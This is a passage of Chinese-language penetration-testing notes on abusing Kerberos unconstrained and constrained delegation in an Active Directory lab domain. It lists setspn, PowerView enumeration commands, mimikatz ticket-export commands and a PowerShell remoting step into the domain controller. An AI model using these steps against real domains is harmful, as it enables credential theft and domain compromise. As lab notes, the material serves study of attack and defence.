  ### 账户非受限委派
	设置用户y为服务账户(服务账户有委派权限)
	>setspn -U -A variant/golden y
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/398.png)

	查询非受限委派域内账号，使用powerview
	>Get-NetUser -Unconstrained -Domain zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/399.png)

	利用
	管理员权限打开mimikatz导出TGT
	>privilege::debug
	>sekurlsa::tickets /export
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/400.png)

	清空票据，导入票据
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/401.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/402.png)

	获得Powershell会话
	> Enter-PSSession -ComputerName dc.zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/403.png)
  ### 账户受限委派
	查询受限委派用户
	> Get-DomainUser -TrustedToAuth –Domain zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/404.png)

	查询受限委派主机
	> Get-DomainComputer -TrustedToAuth -Domain zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/405.png)
	
	利用方法后见权限维持模块
